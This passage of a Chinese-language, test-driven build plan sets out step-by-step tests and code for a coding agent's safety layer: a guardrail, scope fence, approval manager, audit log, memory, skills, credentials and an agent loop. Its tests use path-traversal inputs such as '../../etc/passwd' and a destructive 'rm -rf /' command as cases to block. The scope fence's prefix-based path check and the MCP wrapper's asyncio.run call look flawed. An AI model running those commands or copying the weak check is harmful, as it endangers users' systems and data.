            if decision is not None:
                return decision
        return GuardrailDecision(
            level=GuardrailLevel.ALLOW,
            reason="No rule matched",
            rule_id="DEFAULT",
        )
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_guardrail.py -v`
预期：PASS (12 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/governance/ tests/test_guardrail.py
git commit -m "feat: add GuardrailEngine with 11 deterministic rules (R001-R011)"
```

---

### Task 8：范围围栏

**文件：**
- 创建：`src/codeguard/governance/scope_fence.py`
- 测试：`tests/test_scope_fence.py`

**接口：**
- 产出：`ScopeFence`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_scope_fence.py
import pytest
from pathlib import Path
from codeguard.governance.scope_fence import ScopeFence


def test_allow_path_inside_workspace(tmp_workspace: Path):
    fence = ScopeFence(tmp_workspace)
    ok, reason = fence.check_path("src/main.py")
    assert ok is True


def test_deny_absolute_path(tmp_workspace: Path):
    fence = ScopeFence(tmp_workspace)
    ok, reason = fence.check_path("/etc/passwd")
    assert ok is False
    assert "escapes" in reason.lower()


def test_deny_parent_traversal(tmp_workspace: Path):
    fence = ScopeFence(tmp_workspace)
    ok, reason = fence.check_path("../../etc/passwd")
    assert ok is False
    assert "escapes" in reason.lower()


def test_deny_symlink_escape(tmp_workspace: Path):
    (tmp_workspace / "link").symlink_to("/etc")
    fence = ScopeFence(tmp_workspace)
    ok, reason = fence.check_path("link/passwd")
    assert ok is False


def test_allow_nested_path(tmp_workspace: Path):
    fence = ScopeFence(tmp_workspace)
    ok, reason = fence.check_path("a/b/c/d.py")
    assert ok is True
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_scope_fence.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/governance/scope_fence.py
from __future__ import annotations
from pathlib import Path


class ScopeFence:
    """Enforces workspace boundary — all file ops must stay inside."""

    def __init__(self, workspace_root: Path, allowed_paths: list[Path] | None = None):
        self._root = workspace_root.resolve()
        self._allowed = [p.resolve() for p in (allowed_paths or [])]

    def check_path(self, path: str) -> tuple[bool, str]:
        target = (self._root / path).resolve()
        if str(target).startswith(str(self._root)):
            return True, "OK"
        for allowed in self._allowed:
            if str(target).startswith(str(allowed)):
                return True, "OK (allowed path)"
        return False, f"Path escapes workspace: {target}"
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_scope_fence.py -v`
预期：PASS (5 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/governance/scope_fence.py tests/test_scope_fence.py
git commit -m "feat: add ScopeFence for workspace boundary enforcement"
```

---

### Task 9：HITL 管理器

**文件：**
- 创建：`src/codeguard/governance/hitl.py`
- 测试：`tests/test_hitl.py`

**接口：**
- 消费：`Action`, `HITLRequest`, `HITLState` from Task 2
- 产出：`HITLManager`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_hitl.py
import pytest
from datetime import datetime
from codeguard.governance.hitl import HITLManager
from codeguard.models.entities import Action, HITLState


@pytest.fixture
def manager():
    return HITLManager(timeout=60)


def test_create_request(manager):
    action = Action(name="run_shell", params={"command": "git push"})
    req = manager.create_request(action)
    assert req.state == HITLState.PENDING
    assert req.action.name == "run_shell"


def test_approve_request(manager):
    action = Action(name="run_shell", params={"command": "git push"})
    req = manager.create_request(action)
    manager.resolve(req.id, "approve")
    assert req.state == HITLState.APPROVED
    assert req.resolved_at is not None


def test_deny_request(manager):
    action = Action(name="run_shell", params={"command": "git push"})
    req = manager.create_request(action)
    manager.resolve(req.id, "deny")
    assert req.state == HITLState.DENIED


def test_timeout_request(manager):
    mgr = HITLManager(timeout=0)
    action = Action(name="run_shell", params={"command": "git push"})
    req = mgr.create_request(action)
    mgr.check_timeout(req)
    assert req.state == HITLState.TIMEOUT


def test_unknown_request_id(manager):
    with pytest.raises(KeyError):
        manager.resolve("nonexistent-id", "approve")
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_hitl.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/governance/hitl.py
from __future__ import annotations
from datetime import datetime, timedelta
from uuid import uuid4
from codeguard.models.entities import Action, HITLRequest, HITLState


class HITLManager:
    """Human-in-the-loop approval state machine."""

    def __init__(self, timeout: int = 60):
        self._timeout = timeout
        self._requests: dict[str, HITLRequest] = {}

    def create_request(self, action: Action) -> HITLRequest:
        req = HITLRequest(
            id=str(uuid4()),
            action=action,
            state=HITLState.PENDING,
            created_at=datetime.now(),
        )
        self._requests[req.id] = req
        return req

    def resolve(self, request_id: str, decision: str) -> None:
        if request_id not in self._requests:
            raise KeyError(f"Unknown HITL request: {request_id}")
        req = self._requests[request_id]
        req.state = HITLState.APPROVED if decision == "approve" else HITLState.DENIED
        req.resolved_at = datetime.now()

    def check_timeout(self, req: HITLRequest) -> None:
        if req.state != HITLState.PENDING:
            return
        elapsed = datetime.now() - req.created_at
        if elapsed > timedelta(seconds=self._timeout):
            req.state = HITLState.TIMEOUT
            req.resolved_at = datetime.now()

    def get_pending(self) -> list[HITLRequest]:
        return [r for r in self._requests.values() if r.state == HITLState.PENDING]
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_hitl.py -v`
预期：PASS (5 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/governance/hitl.py tests/test_hitl.py
git commit -m "feat: add HITLManager state machine for human approval flow"
```

---

### Task 10：审计日志

**文件：**
- 创建：`src/codeguard/governance/audit_log.py`
- 测试：`tests/test_audit_log.py`

**接口：**
- 消费：`Action`, `GuardrailDecision`, `ToolResult` from Tasks 2, 7
- 产出：`AuditLog`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_audit_log.py
import json
from pathlib import Path
from codeguard.governance.audit_log import AuditLog
from codeguard.models.entities import Action, GuardrailDecision, GuardrailLevel, ToolResult


def test_audit_log_records(tmp_workspace: Path):
    log = AuditLog(tmp_workspace / ".codeguard" / "audit.log")
    action = Action(name="run_shell", params={"command": "ls"})
    decision = GuardrailDecision(level=GuardrailLevel.ALLOW, reason="OK", rule_id="DEFAULT")
    result = ToolResult(success=True, output="file1\nfile2")
    log.record(action, decision, result)

    entries = log.read_all()
    assert len(entries) == 1
    assert entries[0]["action_name"] == "run_shell"
    assert entries[0]["decision"] == "allow"


def test_audit_log_sanitizes_params(tmp_workspace: Path):
    log = AuditLog(tmp_workspace / ".codeguard" / "audit.log")
    action = Action(name="write_file", params={"path": ".env", "content": "API_KEY=sk-secret123"})
    decision = GuardrailDecision(level=GuardrailLevel.DENY, reason="env file", rule_id="R007")
    result = ToolResult(success=False, error="Denied")
    log.record(action, decision, result)

    entries = log.read_all()
    log_output = json.dumps(entries[0])
    assert "sk-secret123" not in log_output
    assert "***" in log_output


def test_audit_log_multiple_entries(tmp_workspace: Path):
    log = AuditLog(tmp_workspace / ".codeguard" / "audit.log")
    for i in range(3):
        action = Action(name="read_file", params={"path": f"file{i}.py"})
        decision = GuardrailDecision(level=GuardrailLevel.ALLOW, reason="OK", rule_id="DEFAULT")
        result = ToolResult(success=True, output=f"content{i}")
        log.record(action, decision, result)

    entries = log.read_all()
    assert len(entries) == 3
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_audit_log.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/governance/audit_log.py
from __future__ import annotations
import json
from datetime import datetime
from pathlib import Path
from codeguard.models.entities import Action, GuardrailDecision, ToolResult, AuditEntry

_SENSITIVE_KEYS = ("key", "secret", "token", "password", "credential", "api_key")


class AuditLog:
    """Append-only audit log in JSONL format."""

    def __init__(self, log_path: Path):
        self._path = log_path
        self._path.parent.mkdir(parents=True, exist_ok=True)

    def record(self, action: Action, decision: GuardrailDecision, result: ToolResult) -> None:
        entry = AuditEntry(
            timestamp=datetime.now(),
            action_name=action.name,
            params=self._sanitize(action.params),
            decision=decision.level.value,
            result=(result.output[:500] if result.output else result.error)[:500],
        )
        try:
            with open(self._path, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry.__dict__, default=str, ensure_ascii=False) + "\n")
        except OSError:
            pass  # Degrade to stderr, don't block main loop

    def _sanitize(self, params: dict) -> dict:
        sanitized = {}
        for k, v in params.items():
            if any(s in k.lower() for s in _SENSITIVE_KEYS):
                sanitized[k] = "***"
            elif isinstance(v, str) and any(s in v.lower() for s in ("sk-", "key=", "secret")):
                sanitized[k] = "***"
            else:
                sanitized[k] = v
        return sanitized

    def read_all(self) -> list[dict]:
        if not self._path.exists():
            return []
        entries = []
        with open(self._path, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    entries.append(json.loads(line))
        return entries
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_audit_log.py -v`
预期：PASS (3 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/governance/audit_log.py tests/test_audit_log.py
git commit -m "feat: add AuditLog with JSONL format and param sanitization"
```

---

## Phase 4：反馈与上下文

### Task 11：反馈验证器

**文件：**
- 创建：`src/codeguard/feedback/__init__.py`
- 创建：`src/codeguard/feedback/result.py`
- 创建：`src/codeguard/feedback/validators.py`
- 测试：`tests/test_feedback.py`

**接口：**
- 消费：`ToolResult` from Task 2
- 产出：`FeedbackResult`, `TestValidator`, `LintValidator`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_feedback.py
from codeguard.feedback.validators import TestValidator, LintValidator
from codeguard.models.entities import ToolResult


def test_test_validator_pass():
    output = "1 passed in 0.5s"
    result = ToolResult(success=True, output=output, exit_code=0)
    validator = TestValidator()
    feedback = validator.validate(result)
    assert feedback.success is True
    assert "passed" in feedback.details


def test_test_validator_fail():
    output = "1 failed\n    assert False\n"
    result = ToolResult(success=False, output=output, exit_code=1)
    validator = TestValidator()
    feedback = validator.validate(result)
    assert feedback.success is False
    assert len(feedback.failures) > 0


def test_test_validator_to_message():
    output = "1 passed"
    result = ToolResult(success=True, output=output, exit_code=0)
    validator = TestValidator()
    feedback = validator.validate(result)
    msg = feedback.to_message()
    assert "PASSED" in msg


def test_lint_validator_pass():
    output = "All checks passed"
    result = ToolResult(success=True, output=output, exit_code=0)
    validator = LintValidator()
    feedback = validator.validate(result)
    assert feedback.success is True


def test_lint_validator_fail():
    output = "src/main.py:10: E501 line too long"
    result = ToolResult(success=False, output=output, exit_code=1)
    validator = LintValidator()
    feedback = validator.validate(result)
    assert feedback.success is False
    assert len(feedback.failures) > 0
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_feedback.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/feedback/__init__.py
```

```python
# src/codeguard/feedback/result.py
from codeguard.models.entities import FeedbackResult
```

```python
# src/codeguard/feedback/validators.py
from __future__ import annotations
import re
from codeguard.models.entities import ToolResult, FeedbackResult


class TestValidator:
    """Parses test output into structured feedback — deterministic code."""

    def validate(self, result: ToolResult) -> FeedbackResult:
        output = result.output
        if result.exit_code == 0 or result.success:
            return FeedbackResult(
                validator="test",
                success=True,
                details=output,
            )
        failures = self._parse_failures(output)
        return FeedbackResult(
            validator="test",
            success=False,
            details=output,
            failures=failures,
            suggestions=["Fix the failing tests listed above"],
        )

    def _parse_failures(self, output: str) -> list[str]:
        patterns = [
            r"(FAILED.*)",
            r"(.*assert.*)",
            r"(.*Error:.*)",
        ]
        failures = []
        for line in output.splitlines():
            for pattern in patterns:
                if re.search(pattern, line):
                    failures.append(line.strip())
                    break
        return failures or ["Test failed (see details)"]


class LintValidator:
    """Parses lint output into structured feedback — deterministic code."""

    def validate(self, result: ToolResult) -> FeedbackResult:
        output = result.output
        if result.exit_code == 0 or result.success:
            return FeedbackResult(
                validator="lint",
                success=True,
                details=output,
            )
        errors = self._parse_errors(output)
        return FeedbackResult(
            validator="lint",
            success=False,
            details=output,
            failures=errors,
            suggestions=["Fix the lint errors listed above"],
        )

    def _parse_errors(self, output: str) -> list[str]:
        errors = []
        for line in output.splitlines():
            if re.search(r"^\S+:\d+:", line):
                errors.append(line.strip())
        return errors or ["Lint errors detected (see details)"]
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_feedback.py -v`
预期：PASS (5 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/feedback/ tests/test_feedback.py
git commit -m "feat: add TestValidator and LintValidator for deterministic feedback parsing"
```

---

### Task 12：记忆存储

**文件：**
- 创建：`src/codeguard/memory/__init__.py`
- 创建：`src/codeguard/memory/store.py`
- 测试：`tests/test_memory.py`

**接口：**
- 产出：`MemoryStore`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_memory.py
import pytest
from pathlib import Path
from codeguard.memory.store import MemoryStore


def test_save_and_load(tmp_workspace: Path):
    store = MemoryStore(tmp_workspace / ".codeguard" / "memory.json")
    store.save("test_framework", "convention", "pytest")
    entry = store.load("test_framework")
    assert entry is not None
    assert entry.value == "pytest"
    assert entry.category == "convention"


def test_load_nonexistent(tmp_workspace: Path):
    store = MemoryStore(tmp_workspace / ".codeguard" / "memory.json")
    entry = store.load("nonexistent")
    assert entry is None


def test_query_by_category(tmp_workspace: Path):
    store = MemoryStore(tmp_workspace / ".codeguard" / "memory.json")
    store.save("framework", "convention", "pytest")
    store.save("style", "convention", "black")
    store.save("decision1", "decision", "use mock LLM")
    results = store.query(category="convention")
    assert len(results) == 2


def test_clear(tmp_workspace: Path):
    store = MemoryStore(tmp_workspace / ".codeguard" / "memory.json")
    store.save("key1", "convention", "value1")
    store.clear("key1")
    assert store.load("key1") is None


def test_persistence_across_instances(tmp_workspace: Path):
    path = tmp_workspace / ".codeguard" / "memory.json"
    store1 = MemoryStore(path)
    store1.save("key", "convention", "value")
    store2 = MemoryStore(path)
    entry = store2.load("key")
    assert entry is not None
    assert entry.value == "value"
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_memory.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/memory/__init__.py
```

```python
# src/codeguard/memory/store.py
from __future__ import annotations
import json
from datetime import datetime
from pathlib import Path
from codeguard.models.entities import MemoryEntry


class MemoryStore:
    """Cross-session memory — JSON storage, query on demand."""

    def __init__(self, storage_path: Path):
        self._path = storage_path
        self._path.parent.mkdir(parents=True, exist_ok=True)

    def _read_all(self) -> dict[str, dict]:
        if not self._path.exists():
            return {}
        try:
            with open(self._path, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            return {}

    def _write_all(self, data: dict[str, dict]) -> None:
        with open(self._path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, default=str)

    def save(self, key: str, category: str, value: str) -> None:
        data = self._read_all()
        data[key] = {
            "key": key,
            "category": category,
            "value": value,
            "updated_at": datetime.now().isoformat(),
        }
        self._write_all(data)

    def load(self, key: str) -> MemoryEntry | None:
        data = self._read_all()
        if key not in data:
            return None
        d = data[key]
        return MemoryEntry(
            key=d["key"],
            category=d["category"],
            value=d["value"],
            updated_at=datetime.fromisoformat(d["updated_at"]),
        )

    def query(self, category: str | None = None) -> list[MemoryEntry]:
        data = self._read_all()
        results = []
        for d in data.values():
            if category is None or d.get("category") == category:
                results.append(MemoryEntry(
                    key=d["key"],
                    category=d["category"],
                    value=d["value"],
                    updated_at=datetime.fromisoformat(d["updated_at"]),
                ))
        return results

    def clear(self, key: str) -> None:
        data = self._read_all()
        data.pop(key, None)
        self._write_all(data)
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_memory.py -v`
预期：PASS (5 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/memory/ tests/test_memory.py
git commit -m "feat: add MemoryStore for cross-session JSON memory"
```

---

### Task 13：技能加载器

**文件：**
- 创建：`src/codeguard/skills/__init__.py`
- 创建：`src/codeguard/skills/loader.py`
- 创建：`skills/tdd-workflow.md`
- 测试：`tests/test_skill_loader.py`

**接口：**
- 产出：`SkillLoader`, `Skill`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_skill_loader.py
import pytest
from pathlib import Path
from codeguard.skills.loader import SkillLoader


def test_load_skills_from_dir(tmp_path: Path):
    skills_dir = tmp_path / "skills"
    skills_dir.mkdir()
    (skills_dir / "tdd.md").write_text(
        "---\nname: tdd\ntigger: test,tdd\n---\nWrite test first\n"
    )
    loader = SkillLoader(skills_dir)
    skills = loader.load()
    assert len(skills) == 1
    assert skills[0].name == "tdd"


def test_match_skills(tmp_path: Path):
    skills_dir = tmp_path / "skills"
    skills_dir.mkdir()
    (skills_dir / "tdd.md").write_text(
        "---\nname: tdd\ntrigger: test,tdd,red-green\n---\nWrite test first\n"
    )
    (skills_dir / "deploy.md").write_text(
        "---\nname: deploy\ntrigger: deploy,release\n---\nDeploy steps\n"
    )
    loader = SkillLoader(skills_dir)
    matched = loader.match("write a test for sorting")
    assert len(matched) == 1
    assert matched[0].name == "tdd"


def test_empty_dir(tmp_path: Path):
    loader = SkillLoader(tmp_path / "nonexistent")
    skills = loader.load()
    assert skills == []


def test_malformed_skill_skipped(tmp_path: Path):
    skills_dir = tmp_path / "skills"
    skills_dir.mkdir()
    (skills_dir / "bad.md").write_text("No frontmatter here")
    (skills_dir / "good.md").write_text(
        "---\nname: good\ntrigger: test\n---\nGood skill\n"
    )
    loader = SkillLoader(skills_dir)
    skills = loader.load()
    assert len(skills) == 1
    assert skills[0].name == "good"
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_skill_loader.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/skills/__init__.py
```

```python
# src/codeguard/skills/loader.py
from __future__ import annotations
import re
from pathlib import Path
from codeguard.models.entities import Skill


class SkillLoader:
    """Loads markdown skill files and matches them to context."""

    def __init__(self, skills_dir: Path):
        self._dir = skills_dir

    def load(self) -> list[Skill]:
        if not self._dir.exists():
            return []
        skills = []
        for f in self._dir.glob("*.md"):
            try:
                skill = self._parse_file(f)
                if skill:
                    skills.append(skill)
            except Exception:
                continue
        return skills

    def _parse_file(self, path: Path) -> Skill | None:
        content = path.read_text(encoding="utf-8")
        match = re.match(r"^---\n(.*?)\n---\n(.*)", content, re.DOTALL)
        if not match:
            return None
        frontmatter = match.group(1)
        instructions = match.group(2).strip()
        name = self._extract(frontmatter, "name")
        trigger = self._extract(frontmatter, "trigger")
        if not name:
            return None
        return Skill(name=name, trigger=trigger, instructions=instructions, file_path=str(path))

    def _extract(self, text: str, key: str) -> str:
        match = re.search(rf"^{key}:\s*(.+)$", text, re.MULTILINE)
        return match.group(1).strip() if match else ""

    def match(self, context: str) -> list[Skill]:
        skills = self.load()
        matched = []
        context_lower = context.lower()
        for skill in skills:
            triggers = [t.strip().lower() for t in skill.trigger.split(",")]
            if any(t in context_lower for t in triggers):
                matched.append(skill)
        return matched
```

创建 `skills/tdd-workflow.md`:
```markdown
---
name: tdd-workflow
trigger: test,tdd,red-green,implement
---

## TDD Workflow

1. Write a failing test first
2. Run the test to confirm it fails (red)
3. Write minimal code to make it pass (green)
4. Refactor
5. Repeat
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_skill_loader.py -v`
预期：PASS (4 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/skills/ skills/tdd-workflow.md tests/test_skill_loader.py
git commit -m "feat: add SkillLoader for markdown skill files"
```

---

## Phase 5：基础服务

### Task 14：凭据管理器

**文件：**
- 创建：`src/codeguard/credentials/__init__.py`
- 创建：`src/codeguard/credentials/manager.py`
- 测试：`tests/test_credential_manager.py`

**接口：**
- 产出：`CredentialManager`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_credential_manager.py
import pytest
from pathlib import Path
from codeguard.credentials.manager import CredentialManager


@pytest.fixture
def cred_mgr(tmp_workspace: Path):
    mgr = CredentialManager(tmp_workspace / ".codeguard" / "credentials.enc")
    mgr.unlock("test-master-password")
    return mgr


def test_store_and_get(cred_mgr):
    cred_mgr.store("llm_api_key", "sk-test123")
    value = cred_mgr.get("llm_api_key")
    assert value == "sk-test123"


def test_status_configured(cred_mgr):
    cred_mgr.store("llm_api_key", "sk-test123")
    assert cred_mgr.status("llm_api_key") is True


def test_status_not_configured(cred_mgr):
    assert cred_mgr.status("llm_api_key") is False


def test_clear(cred_mgr):
    cred_mgr.store("llm_api_key", "sk-test123")
    cred_mgr.clear("llm_api_key")
    assert cred_mgr.status("llm_api_key") is False
    assert cred_mgr.get("llm_api_key") is None


def test_update(cred_mgr):
    cred_mgr.store("llm_api_key", "old-key")
    cred_mgr.store("llm_api_key", "new-key")
    assert cred_mgr.get("llm_api_key") == "new-key"


def test_wrong_password_fails(tmp_workspace: Path):
    mgr1 = CredentialManager(tmp_workspace / ".codeguard" / "credentials.enc")
    mgr1.unlock("correct-password")
    mgr1.store("key", "value")

    mgr2 = CredentialManager(tmp_workspace / ".codeguard" / "credentials.enc")
    assert mgr2.unlock("wrong-password") is False
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_credential_manager.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/credentials/__init__.py
```

```python
# src/codeguard/credentials/manager.py
from __future__ import annotations
import base64
import json
import os
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class CredentialManager:
    """Secure credential storage with Fernet encryption."""

    def __init__(self, storage_path: Path):
        self._path = storage_path
        self._path.parent.mkdir(parents=True, exist_ok=True)
        self._fernet: Fernet | None = None
        self._salt_path = storage_path.with_suffix(".salt")

    def unlock(self, master_password: str) -> bool:
        salt = self._get_or_create_salt()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=480000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(master_password.encode()))
        self._fernet = Fernet(key)
        return self._verify()

    def _get_or_create_salt(self) -> bytes:
        if self._salt_path.exists():
            return self._salt_path.read_bytes()
        salt = os.urandom(16)
        self._salt_path.write_bytes(salt)
        self._salt_path.chmod(0o600)
        return salt

    def _verify(self) -> bool:
        if not self._path.exists():
            return True
        try:
            self._read_all()
            return True
        except Exception:
            return False

    def _read_all(self) -> dict[str, str]:
        if not self._path.exists():
            return {}
        encrypted = self._path.read_bytes()
        decrypted = self._fernet.decrypt(encrypted)
        return json.loads(decrypted.decode())

    def _write_all(self, data: dict[str, str]) -> None:
        encrypted = self._fernet.encrypt(json.dumps(data).encode())
        self._path.write_bytes(encrypted)
        self._path.chmod(0o600)

    def store(self, key_name: str, value: str) -> None:
        data = self._read_all()
        data[key_name] = value
        self._write_all(data)

    def get(self, key_name: str) -> str | None:
        data = self._read_all()
        return data.get(key_name)

    def status(self, key_name: str) -> bool:
        data = self._read_all()
        return key_name in data

    def clear(self, key_name: str) -> None:
        data = self._read_all()
        data.pop(key_name, None)
        self._write_all(data)
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_credential_manager.py -v`
预期：PASS (6 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/credentials/ tests/test_credential_manager.py
git commit -m "feat: add CredentialManager with Fernet encryption"
```

---

### Task 15：MCP 工具适配器

**文件：**
- 创建：`src/codeguard/mcp/__init__.py`
- 创建：`src/codeguard/mcp/adapter.py`
- 测试：`tests/test_mcp_adapter.py`

**接口：**
- 消费：`Tool`, `ToolDispatcher` from Task 4
- 产出：`MCPToolAdapter`, `MCPToolWrapper`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_mcp_adapter.py
import pytest
from codeguard.mcp.adapter import MCPToolAdapter, MCPToolWrapper
from codeguard.tools.dispatcher import ToolDispatcher
from codeguard.models.entities import ToolResult


class FakeMCPClient:
    """Simulates an MCP server connection."""
    def __init__(self, tools: list[dict]):
        self._tools = tools

    async def list_tools(self) -> list[dict]:
        return self._tools

    async def call_tool(self, name: str, params: dict) -> dict:
        return {"result": f"called {name} with {params}"}


@pytest.mark.asyncio
async def test_connect_and_register():
    dispatcher = ToolDispatcher()
    adapter = MCPToolAdapter(dispatcher)
    mcp_client = FakeMCPClient(tools=[
        {"name": "design_ui", "description": "Design a UI component", "schema": {}}
    ])
    tools = await adapter.connect("test-server", mcp_client)
    assert len(tools) == 1
    assert "design_ui" in dispatcher.list_tools()


@pytest.mark.asyncio
async def test_mcp_tool_wrapper_executes():
    mcp_client = FakeMCPClient(tools=[])
    wrapper = MCPToolWrapper("echo", mcp_client)
    result = wrapper.execute({"text": "hello"})
    assert result.success is True
    assert "echo" in result.output


@pytest.mark.asyncio
async def test_connect_failure_does_not_block():
    dispatcher = ToolDispatcher()
    adapter = MCPToolAdapter(dispatcher)

    class FailingMCPClient:
        async def list_tools(self):
            raise ConnectionError("Server unavailable")

    tools = await adapter.connect("bad-server", FailingMCPClient())
    assert tools == []
    assert len(dispatcher.list_tools()) == 0
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_mcp_adapter.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/mcp/__init__.py
```

```python
# src/codeguard/mcp/adapter.py
from __future__ import annotations
import logging
from codeguard.models.entities import ToolResult
from codeguard.tools.base import Tool
from codeguard.tools.dispatcher import ToolDispatcher

logger = logging.getLogger(__name__)


class MCPToolWrapper(Tool):
    """Wraps an MCP server tool into the Tool interface."""

    def __init__(self, name: str, mcp_client):
        self.name = name
        self._client = mcp_client

    def execute(self, params: dict) -> ToolResult:
        import asyncio
        try:
            result = asyncio.run(self._client.call_tool(self.name, params))
            return ToolResult(success=True, output=str(result.get("result", "")))
        except Exception as e:
            return ToolResult(success=False, error=str(e))


class MCPToolAdapter:
    """Connects to MCP servers and registers their tools."""

    def __init__(self, dispatcher: ToolDispatcher):
        self._dispatcher = dispatcher

    async def connect(self, server_name: str, mcp_client) -> list[Tool]:
        try:
            tool_defs = await mcp_client.list_tools()
        except Exception as e:
            logger.warning(f"Failed to connect to MCP server '{server_name}': {e}")
            return []

        registered = []
        for td in tool_defs:
            tool = MCPToolWrapper(td["name"], mcp_client)
            self._dispatcher.register(tool)
            registered.append(tool)
        return registered
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_mcp_adapter.py -v`
预期：PASS (3 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/mcp/ tests/test_mcp_adapter.py
git commit -m "feat: add MCPToolAdapter for external MCP server tool registration"
```

---

## Phase 6：集成

### Task 16：Agent 主循环

**文件：**
- 创建：`src/codeguard/agent/action.py`
- 创建：`src/codeguard/agent/loop.py`
- 测试：`tests/test_agent_loop.py`

**接口：**
- 消费：之前所有模块
- 产出：`AgentLoop`, `parse_action()`

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_agent_loop.py
import pytest
from pathlib import Path
from codeguard.agent.loop import AgentLoop
from codeguard.agent.llm_client import MockLLMClient
from codeguard.models.entities import LLMResponse, Message, MessageRole
from codeguard.tools.dispatcher import ToolDispatcher
from codeguard.tools.file_tools import WriteFile, ReadFile
from codeguard.governance.guardrail import GuardrailEngine
from codeguard.governance.rules import default_rules
from codeguard.governance.hitl import HITLManager
from codeguard.governance.audit_log import AuditLog
from codeguard.governance.scope_fence import ScopeFence
from codeguard.feedback.validators import TestValidator
from codeguard.memory.store import MemoryStore
from codeguard.skills.loader import SkillLoader


@pytest.fixture
def agent_setup(tmp_workspace: Path):
    dispatcher = ToolDispatcher()
    dispatcher.register(WriteFile(tmp_workspace))
    dispatcher.register(ReadFile(tmp_workspace))

    responses = [
        LLMResponse(
            content="Writing file",
            tool_calls=[{"name": "write_file", "params": {"path": "test.py", "content": "x = 1"}}],
        ),
        LLMResponse(content="Done", tool_calls=[]),
    ]

    loop = AgentLoop(
        llm_client=MockLLMClient(responses),
        tool_dispatcher=dispatcher,
        guardrail_engine=GuardrailEngine(default_rules()),
        hitl_manager=HITLManager(),
        audit_log=AuditLog(tmp_workspace / ".codeguard" / "audit.log"),
        scope_fence=ScopeFence(tmp_workspace),
        feedback_validator=TestValidator(),
        memory_store=MemoryStore(tmp_workspace / ".codeguard" / "memory.json"),
        skill_loader=SkillLoader(tmp_workspace / "skills"),
        workspace_root=tmp_workspace,
    )
    return loop, tmp_workspace


@pytest.mark.asyncio
async def test_agent_loop_executes_action(agent_setup):
    loop, workspace = agent_setup
    steps = await loop.run("Write x=1 to test.py")
    assert len(steps) > 0
    assert (workspace / "test.py").exists()
    assert (workspace / "test.py").read_text() == "x = 1"


@pytest.mark.asyncio
async def test_agent_loop_stops_on_done(agent_setup):
    loop, _ = agent_setup
    steps = await loop.run("Write x=1 to test.py")
    assert steps[-1].step_type.value == "result" or steps[-1].step_type.value == "think"


@pytest.mark.asyncio
async def test_agent_loop_guardrail_blocks_dangerous_action(tmp_workspace: Path):
    dispatcher = ToolDispatcher()
    responses = [
        LLMResponse(
            content="Deleting",
            tool_calls=[{"name": "run_shell", "params": {"command": "rm -rf /"}}],
        ),
        LLMResponse(content="Done", tool_calls=[]),
    ]
    loop = AgentLoop(
        llm_client=MockLLMClient(responses),
        tool_dispatcher=dispatcher,
        guardrail_engine=GuardrailEngine(default_rules()),
        hitl_manager=HITLManager(),
        audit_log=AuditLog(tmp_workspace / ".codeguard" / "audit.log"),
        scope_fence=ScopeFence(tmp_workspace),
        feedback_validator=TestValidator(),
        memory_store=MemoryStore(tmp_workspace / ".codeguard" / "memory.json"),
        skill_loader=SkillLoader(tmp_workspace / "skills"),
        workspace_root=tmp_workspace,
    )
